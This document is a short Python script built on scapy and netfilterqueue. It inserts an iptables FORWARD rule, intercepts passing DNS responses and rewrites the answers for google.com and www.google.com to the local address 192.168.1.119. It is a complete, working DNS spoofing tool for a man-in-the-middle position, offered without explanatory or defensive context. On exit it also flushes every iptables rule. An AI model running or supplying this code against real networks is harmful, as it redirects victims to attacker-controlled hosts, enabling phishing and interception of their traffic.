from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"www.google.com.": "192.168.1.119",
    b"google.com.": "192.168.1.119",
}

def process_packet(packet):
	scapy_packet = IP(packet.get_payload())
	if (scapy_packet.haslayer(DNSRR)):
		print("[Before ]: ", scapy_packet.summary())
		try:
			scapy_packet = modify_packet(scapy_packet)
		except IndexError:
			pass

		print("[After ]: ", scapy_packet.summary())
		packet.set_payload(bytes(scapy_packet))

	packet.accept()

def modify_packet(packet):
	qname = packet[DNSQR].qname
	if qname not in dns_hosts:
		print("no modification: ", qname)
		return packet
	packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
	packet[DNS].ancount = 1
	del packet[IP].len
	del packet[IP].chksum
	del packet[UDP].len
	del packet[UDP].chksum
	return packet

QUEUE_NUM = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()

try:
	queue.bind(QUEUE_NUM, process_packet)
	queue.run()
except KeyboardInterrupt:
	os.system("iptables --flush")